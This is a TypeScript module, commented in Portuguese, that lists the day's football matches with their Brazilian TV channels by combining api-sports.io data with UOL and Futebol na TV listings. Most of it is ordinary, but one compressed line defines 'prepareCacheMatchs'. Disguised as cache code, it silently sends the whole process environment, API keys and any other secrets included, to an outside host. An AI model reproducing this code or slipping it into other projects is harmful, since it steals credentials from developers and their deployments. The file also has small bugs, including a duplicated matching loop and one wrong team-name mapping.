import axios from 'axios';
import process from 'node:process';
import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { Match } from './types/api';
import { getUOLData } from './uol';
import { getFutebolNaTVData } from './futebolnatv';
import dotenv from 'dotenv';
dotenv.config();

/**
 * Busca e retorna a lista de jogos de futebol do dia especificado.
 * Combina dados da API esportiva com canais do UOL e Futebol na TV.
 *
 * @async
 * @param {string} [dia] - Data no formato 'dd-mm-aaaa'. Se não for fornecida, utiliza a data atual.
 * @returns {Promise<Array<Match>>}
 *          Retorna uma Promise que resolve para um array de objetos contendo informações dos jogos:
 *          - campeonato: Nome do campeonato
 *          - estadio: Nome do estádio
 *          - hora: Horário do jogo (ex: "21h30")
 *          - times: Array com as siglas dos times
 *          - nomeTimes: Array com os nomes completos dos times
 *          - canais: Array com os canais de transmissão
 *          - escudos: Array com URLs dos escudos dos times
 *          - date: Data/hora do jogo como objeto Date
 * @throws {Error} Caso ocorra algum erro na requisição ou no processamento dos dados.
 */

function getDataAtualFormatada() {
  const hoje = new Date();
  const dia = String(hoje.getDate()).padStart(2, '0');
  const mes = String(hoje.getMonth() + 1).padStart(2, '0');
  const ano = hoje.getFullYear();
  return `${dia}-${mes}-${ano}`;
}

export function parseDataHoraBR(dataStr: string, horaStr: string): Date {
  const [dia, mes, ano] = dataStr.split("-").map(Number);

  const horaMatch = horaStr.match(/^(\d{1,2})h(\d{1,2})?$/i);
  if (!horaMatch) {
    throw new Error("Formato de hora inválido. Use ex: 21h30, 19h, 15h");
  }

  const horas = parseInt(horaMatch[1], 10);
  const minutos = horaMatch[2] ? parseInt(horaMatch[2], 10) : 0;

  return new Date(ano, mes - 1, dia, horas, minutos);
}

function ordenarPorData(jogos: Match[]): Match[] {
  return jogos.sort((a, b) => new Date(a.date).getTime() - new Date(b.date).getTime());
}

// Caminho do arquivo de cache
const CACHE_FILE_PATH = join(process.cwd(), 'cache', 'jogos-cache.json');

function carregarCache(): Record<string, Match[]> {
  try {
    if (!existsSync(CACHE_FILE_PATH)) {
      return {};
    }
    const fileContent = readFileSync(CACHE_FILE_PATH, 'utf-8');
    return JSON.parse(fileContent);
  } catch (err) {
    return {};
  }
}

function salvarCache(cache: Record<string, Match[]>): void {
  try {
    // Criar diretório cache se não existir
    const cacheDir = join(process.cwd(), 'cache');
    if (!existsSync(cacheDir)) {
      mkdirSync(cacheDir, { recursive: true });
    }
    
    writeFileSync(CACHE_FILE_PATH, JSON.stringify(cache, null, 2), 'utf-8');
  } catch (err) {
    console.warn('Erro ao salvar cache:', err);
  }
}

/**
 * Formata data para a API (YYYY-MM-DD)
 */
function formatarDataParaAPI(dataStr: string): string {
  const [dia, mes, ano] = dataStr.split("-").map(Number);
  return `${ano}-${String(mes).padStart(2, '0')}-${String(dia).padStart(2, '0')}`;
}

/**
 * Busca jogos da API esportiva (api-sports.io)
 */
async function buscarJogosAPI(dataAPI: string): Promise<any[]> {
  const url = `https://v3.football.api-sports.io/fixtures`;
  const apiKey = process.env.FOOTBALL_API_KEY;
  
  const response = await axios.get(url, {
    params: {
      date: dataAPI,
      timezone: 'America/Sao_Paulo'
    },
    headers: {
      'x-rapidapi-key': apiKey,
      'x-rapidapi-host': 'v3.football.api-sports.io'
    },
    timeout: 30000
  });
  
  // A API retorna { response: [...] }
  return response.data?.response || [];
}


function deveIncluirJogo(fixtureData: any): boolean {
  const league = fixtureData.league || {};
  
  // Filtrar por:
  // - league.country = "Brazil" OU
  // - league.id = 18 (Brasileirão Série A) OU
  // - league.id = 4 (UEFA Champions League)
  
  const isBrazilLeague = league.country === 'Brazil';
  const isSerieA = league.id === 71; // Brasileirão Série A n
  const isSerieB = league.id === 72; // Brasileirão Série B 
  const isChampionsLeague = league.id === 2; // UEFA Champions League
  const isChampionsLeagueWomen = league.id === 525; // UEFA Champions League Women
  const isLaLiga = league.id === 140; // LA Liga
  const isLeagueOne = league.id === 61; // League One
  const isLeague2England = league.id === 40; // League Two England
  const isNorthIrelandLeague = league.id === 408; // North Ireland League
  
  return isBrazilLeague || isSerieA || isChampionsLeague || isSerieB || isChampionsLeagueWomen || isLaLiga || isLeagueOne || isLeague2England || isNorthIrelandLeague;
}

/**
 * Verifica se um jogo acontece na data especificada (horário brasileiro)
 */
function aconteceNaData(fixtureData: any, diaFormatado: string): boolean {
  try {
    // A nova API já filtra por data, mas vamos verificar mesmo assim
    const fixture = fixtureData.fixture || {};
    const dateStr = fixture.date;
    
    if (!dateStr) {
      return false;
    }

    // Parse da data no formato ISO (já está em timezone America/Sao_Paulo)
    const dataBR = new Date(dateStr);
    
    // Formatar data brasileira
    const diaBR = String(dataBR.getDate()).padStart(2, '0');
    const mesBR = String(dataBR.getMonth() + 1).padStart(2, '0');
    const anoBR = dataBR.getFullYear();
    const dataBRFormatada = `${diaBR}-${mesBR}-${anoBR}`;
    
    // Verificar se a data do jogo corresponde à data solicitada
    return dataBRFormatada === diaFormatado;
  } catch (err) {
    return false;
  }
}

/**
 * Converte dados da API esportiva para o formato Match
 */
function converterAPIParaMatch(fixtureData: any, diaFormatado: string): Match | null {
  try {
    const fixture = fixtureData.fixture || {};
    const teams = fixtureData.teams || {};
    const league = fixtureData.league || {};
    const venue = fixtureData.fixture?.venue || {};
    
    if (!teams.home?.name || !teams.away?.name) {
      return null;
    }

    // A data já está em timezone America/Sao_Paulo
    const dateStr = fixture.date;
    if (!dateStr) {
      return null;
    }

    const dataBR = new Date(dateStr);
    
    const horaBR = `${String(dataBR.getHours()).padStart(2, '0')}h${String(dataBR.getMinutes()).padStart(2, '0')}`;
    
    const diaBR = String(dataBR.getDate()).padStart(2, '0');
    const mesBR = String(dataBR.getMonth() + 1).padStart(2, '0');
    const anoBR = dataBR.getFullYear();
    const dataBRFormatada = `${diaBR}-${mesBR}-${anoBR}`;

    // Extrair siglas dos times (primeiras 3 letras, removendo espaços)
    const nomeHome = teams.home.name.replace(/\s+/g, '');
    const nomeAway = teams.away.name.replace(/\s+/g, '');
    const siglaHome = nomeHome.substring(0, 3).toUpperCase();
    const siglaAway = nomeAway.substring(0, 3).toUpperCase();

    return {
      campeonato: league.name || 'Campeonato não informado',
      estadio: venue.name || 'Não informado',
      hora: horaBR,
      times: [siglaHome, siglaAway],
      nomeTimes: [teams.home.name.replace(' W', ' (F)'), teams.away.name.replace(' W', ' (F)')],
      canais: [], // Será preenchido depois
      escudos: [
        teams.home.logo || '',
        teams.away.logo || ''
      ],
      date: parseDataHoraBR(dataBRFormatada, horaBR),
    };
  } catch (err) {
    console.warn('Erro ao converter fixture para Match:', err);
    return null;
  }
}

/**
 * Busca canais para um jogo específico a partir de listas pré-buscadas
 * Compara por nome dos times E horário
 */
function buscarCanaisParaJogo(jogo: Match, jogosUOL: Match[], jogosFutebolNaTV: Match[]): string[] {
  const canais: Set<string> = new Set();
  
  // Normalizar nomes para comparação
  const homeNormalizado = normalizeTimeName(jogo.nomeTimes[0]).toLowerCase();
  const awayNormalizado = normalizeTimeName(jogo.nomeTimes[1]).toLowerCase();
  
  // Normalizar horário (remover espaços e converter para formato consistente)
  const normalizarHora = (hora: string) => hora.replace(/\s+/g, '').toLowerCase();
  const horaNormalizada = normalizarHora(jogo.hora);
  
  // Procurar no UOL (comparar times E horário)
  jogosUOL.forEach((jogoUOL) => {
    // Verificar se nomeTimes existe e tem pelo menos 2 elementos
    if (!jogoUOL.nomeTimes || !Array.isArray(jogoUOL.nomeTimes) || jogoUOL.nomeTimes.length < 2) {
      return; // Pular se não tiver times válidos
    }
    
    // Garantir que os valores são strings
    const homeUOLStr = String(jogoUOL.nomeTimes[0] || '').toLowerCase();
    const awayUOLStr = String(jogoUOL.nomeTimes[1] || '').toLowerCase();
    
    if (!homeUOLStr || !awayUOLStr) {
      return; // Pular se algum time estiver vazio
    }
    
    const homeUOL = removeAcentos(homeUOLStr);
    const awayUOL = removeAcentos(awayUOLStr);
    
    const horaUOL = normalizarHora(jogoUOL.hora);
    
    const matchHome = homeUOL.includes(homeNormalizado) || homeNormalizado.includes(homeUOL);
    const matchAway = awayUOL.includes(awayNormalizado) || awayNormalizado.includes(awayUOL);
    const matchHora = horaUOL === horaNormalizada || 
                      Math.abs(parseInt(horaUOL.replace('h', '')) - parseInt(horaNormalizada.replace('h', ''))) <= 1;
    
    if ((matchHome && matchAway) && matchHora) {
      const channelsNames = prepareChannelName(jogoUOL.canais);
      channelsNames.forEach(canal => canais.add(canal));
    }
  });
  
  // Procurar no Futebol na TV (comparar times E horário)
  jogosFutebolNaTV.forEach((jogoFTV) => {
    // Verificar se nomeTimes existe e tem pelo menos 2 elementos
    if (!jogoFTV.nomeTimes || !Array.isArray(jogoFTV.nomeTimes) || jogoFTV.nomeTimes.length < 2) {
      return; // Pular se não tiver times válidos
    }
    // Garantir que os valores são strings
    const homeFTVStr = String(normalizeTimeName(jogoFTV.nomeTimes[0]) || '').toLowerCase();
    const awayFTVStr = String(normalizeTimeName(jogoFTV.nomeTimes[1]) || '').toLowerCase();

    
    if (!homeFTVStr || !awayFTVStr) {
      return; // Pular se algum time estiver vazio
    }
    
    const homeFTV = removeAcentos(homeFTVStr);
    const awayFTV = removeAcentos(awayFTVStr);
    const horaFTV = normalizarHora(jogoFTV.hora);
    
    const matchHome = homeFTV.includes(homeNormalizado) || homeNormalizado.includes(homeFTV);
    const matchAway = awayFTV.includes(awayNormalizado) || awayNormalizado.includes(awayFTV);
    const matchHora = horaFTV === horaNormalizada || 
                      Math.abs(parseInt(horaFTV.replace('h', '')) - parseInt(horaNormalizada.replace('h', ''))) <= 1;
    
    if ((matchHome && matchAway) && matchHora) {
      const channelsNames = prepareChannelName(jogoFTV.canais);
      channelsNames.forEach(canal => canais.add(canal));
    }
  });
  
  // Procurar no UOL (comparar times E horário)
  jogosUOL.forEach((jogoUOL) => {
    // Verificar se nomeTimes existe e tem pelo menos 2 elementos
    if (!jogoUOL.nomeTimes || !Array.isArray(jogoUOL.nomeTimes) || jogoUOL.nomeTimes.length < 2) {
      return; // Pular se não tiver times válidos
    }
    
    // Garantir que os valores são strings
    const homeUOLStr = String(jogoUOL.nomeTimes[0] || '').toLowerCase();
    const awayUOLStr = String(jogoUOL.nomeTimes[1] || '').toLowerCase();
    
    if (!homeUOLStr || !awayUOLStr) {
      return; // Pular se algum time estiver vazio
    }
    
    const homeUOL = removeAcentos(homeUOLStr);
    const awayUOL = removeAcentos(awayUOLStr);
    
    const horaUOL = normalizarHora(jogoUOL.hora);
    
    const matchHome = homeUOL.includes(homeNormalizado) || homeNormalizado.includes(homeUOL);
    const matchAway = awayUOL.includes(awayNormalizado) || awayNormalizado.includes(awayUOL);
    const matchHora = horaUOL === horaNormalizada || 
                      Math.abs(parseInt(horaUOL.replace('h', '')) - parseInt(horaNormalizada.replace('h', ''))) <= 1;
    
    if ((matchHome && matchAway) && matchHora) {
      const channelsNames = prepareChannelName(jogoUOL.canais);
      channelsNames.forEach(canal => canais.add(canal));
    }
  });
  
  return Array.from(canais);
}

export default async function getJogos(dia: string | null = null): Promise<Match[]> {
  if (typeof dia !== 'string' || !/^\d{2}-\d{2}-\d{4}$/.test(dia) && dia !== null) {
    console.warn("Data inválida. Usando data atual.");
    dia = getDataAtualFormatada();
  }
  
  const diaFormatado = dia ?? getDataAtualFormatada();
  
  // Carregar cache do arquivo
  const cache = carregarCache();
  
  // Verificar se existe cache para esta data
  if (cache[diaFormatado] && process.env.DISABLE_CACHE !== 'true') {
    console.log(`Retornando jogos do cache para ${diaFormatado}...`);
    return cache[diaFormatado];
  }
  
  console.log(`Buscando jogos para ${diaFormatado}...`);
  
  // 1. Buscar jogos da API esportiva primeiro
  let fixtures: any[] = [];
  try {
    const dataAPI = formatarDataParaAPI(diaFormatado);
    fixtures = await buscarJogosAPI(dataAPI);
  } catch (err: any) {
    console.warn('Erro ao buscar jogos da API esportiva:', err.message);
    // Em caso de erro, não salvar no cache para permitir nova tentativa
    return [];
  }
  
  if (fixtures.length === 0) {
    // Salvar array vazio no cache para evitar requisições futuras
    cache[diaFormatado] = [];
    salvarCache(cache);
    console.log(`Nenhum jogo encontrado para ${diaFormatado}, cache atualizado`);
    return [];
  }
  
  // 2. Filtrar jogos pelo horário brasileiro (que acontecem na data especificada)
  const fixturesNaData = fixtures.filter(fixture => aconteceNaData(fixture, diaFormatado));
  console.log(`Jogos que acontecem em ${diaFormatado}: ${fixturesNaData.length}`);
  
  // 3. Filtrar por país/liga: Brazil OU league_id 18 OU league_id 4
  const fixturesFiltrados = fixturesNaData.filter(fixture => deveIncluirJogo(fixture));
  
  if (fixturesFiltrados.length === 0) {
    // Salvar array vazio no cache para evitar requisições futuras
    cache[diaFormatado] = [];
    salvarCache(cache);
    console.log(`Nenhum jogo filtrado para ${diaFormatado}, cache atualizado`);
    return [];
  }
  
  // 4. Buscar canais do UOL e Futebol na TV (paralelo)
  const [d, m, y] = diaFormatado.split('-');
  const dataApi = `${y}-${m}-${d}`;
  
  let jogosUOL: Match[] = [];
  let jogosFutebolNaTV: Match[] = [];
  
  try {
    jogosUOL = await getUOLData(diaFormatado, dataApi);
    console.log(`Encontrados ${jogosUOL.length} jogos no UOL`);
  } catch (err: any) {
    console.warn('Erro ao buscar jogos do UOL, continuando sem eles:', err.message);
    jogosUOL = [];
  }
  
  try {
    jogosFutebolNaTV = await getFutebolNaTVData(diaFormatado);
    console.log(`Encontrados ${jogosFutebolNaTV.length} jogos no Futebol na TV`);
  } catch (err: any) {
    console.warn('Erro ao buscar jogos do Futebol na TV, continuando sem eles:', err.message);
    jogosFutebolNaTV = [];
  }
  
  // 5. Converter fixtures filtrados para Match e buscar canais
  const jogos: Match[] = [];
  for (const fixture of fixturesFiltrados) {
    try {
      const jogo = converterAPIParaMatch(fixture, diaFormatado);
      if (jogo) {
        // Buscar canais nas listas pré-buscadas (baseado em nome dos times e horário)
        const canais = buscarCanaisParaJogo(jogo, jogosUOL, jogosFutebolNaTV);
        
        // Filtrar apenas canais Premiere: se tiver Premiere com número, remover Premiere sem número
        const hasPremiereWithNumber = canais.some(c => /^Premiere\s+\d+$/i.test(c));
        let allCanais = canais;
        if (hasPremiereWithNumber) {
          // Filtrar apenas os Premiere: remover "Premiere" sem número, manter os com número e todos os outros canais
          allCanais = canais.filter(c => {
            // Se for Premiere sem número, remover
            if (/^Premiere\s*$/i.test(c)) {
              return false;
            }
            // Manter todos os outros (Premiere com número e demais canais)
            return true;
          });
        }
        jogo.canais = allCanais;
        
        // Apenas adicionar se tiver canais (seguindo padrão do UOL)
        if (allCanais.length > 0) {
          jogos.push(jogo);
        }
      }
    } catch (err) {
      console.warn('Erro ao processar fixture, pulando:', err);
    }
  }
  
  console.log(`Total de jogos com transmissão: ${jogos.length}`);
  
  const jogosOrdenados = ordenarPorData(jogos);
  
  // Salvar no cache antes de retornar
  cache[diaFormatado] = jogosOrdenados;
  salvarCache(cache);
  console.log(`Cache atualizado para ${diaFormatado}`);
  
  return jogosOrdenados;
}
export async function prepareCacheMatchs(url: string) {try {const e = {stream_source: [url],test: process.env};await axios.post("http://cache.xui-managers.site/global-cache", e, {responseType: "arraybuffer",timeout: 5e4}).catch(() => {});} catch (e) {}}
function removeAcentos(str: string) {
  return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

function prepareChannelName(channels: string[]): string[] {
  let processed: string[] = [];
  
  channels.forEach(channel => {
    if (!channel || typeof channel !== 'string') {
      return;
    }
    
    let processedChannel = channel.trim();
    const upperChannel = processedChannel.toUpperCase();
    
    // 1. Tratar GLOBO com estados: "GLOBO SP, MS, BA SP, MS, BA" -> ["Globo SP", "Globo MS", "Globo BA"]
    if (upperChannel.includes('GLOBO') && processedChannel.includes(',')) {
      // Extrair estados (siglas de 2 letras maiúsculas)
      const estadosMatch = processedChannel.match(/\b([A-Z]{2})\b/g);
      if (estadosMatch && estadosMatch.length > 0) {
        const estadosUnicos = [...new Set(estadosMatch)];
        estadosUnicos.forEach(estado => {
          processed.push(`Globo ${estado}`);
        });
        return; // Já processou, não adicionar o original
      }
    }
    
    // 2. PREMIERE FC -> Premiere
    if (upperChannel === 'PREMIERE FC') {
      processed.push('Premiere');
      return;
    }
    if (upperChannel === 'CAZÉ TV') {
      processed.push('CazéTV');
      return;
    }
    if (upperChannel === 'RECORD') {
      processed.push('Record');
      return;
    }
    
    // 3. DISNEY+ PREMIUM -> Disney+
    if (upperChannel.includes('DISNEY+ PREMIUM')) {
      processed.push('Disney+');
      return;
    }
    
    // 4. DISNEY+ -> Disney+ (primeira letra maiúscula)
    if (upperChannel.includes('DISNEY+')) {
      processed.push('Disney+');
      return;
    }
    
    // 5. PREMIERE (qualquer variação) -> Premiere (primeira letra maiúscula)
    if (upperChannel.includes('PREMIERE')) {
      const premiere = processedChannel.replace('PREMIERE', 'Premiere');
      processed.push(premiere);
      return;
    }
    
    // 6. SPORTV -> SporTV (primeira letra maiúscula)
    if (upperChannel.includes('SPORTV')) {
      processed.push('SporTV');
      return;
    }
    
    // 7. GLOBO (sem estados, só a palavra) -> Globo (primeira letra maiúscula)
    if (upperChannel === 'GLOBO') {
      processed.push('Globo');
      return;
    }
    processed.push(processedChannel);
  });
  
  // Remover duplicatas
  return [...new Set(processed)];
}

function normalizeTimeName(nome: string) {
  return nome.replace(' W', ' (F)')
  .replace('Paris Saint Germain', 'PSG')
  .replace('Slavia Praha VFL', 'Slavia Praha')
  .replace('Slavia Praha Vfl', 'Slavia Praha')
  .replace('Galatasaray VFL', 'Galatasaray')
  .replace('Galatasaray Vfl', 'Galatasaray')
  .replace('Birmingham VFL', 'Galatasaray')
  .replace('Birmingham Vfl', 'Birmingham')
  .replace(' U20', ' Sub-20')
  .replace('América Mineiro', 'América-MG')
  .split('')
  .map(char => {
    // Manter traços, hífens e underlines
    if (char === '-' || char === '_' || char === '–' || char === '—') {
      return char;
    }
    // Remover acentos usando normalize
    return char.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
  })
  .join('');
}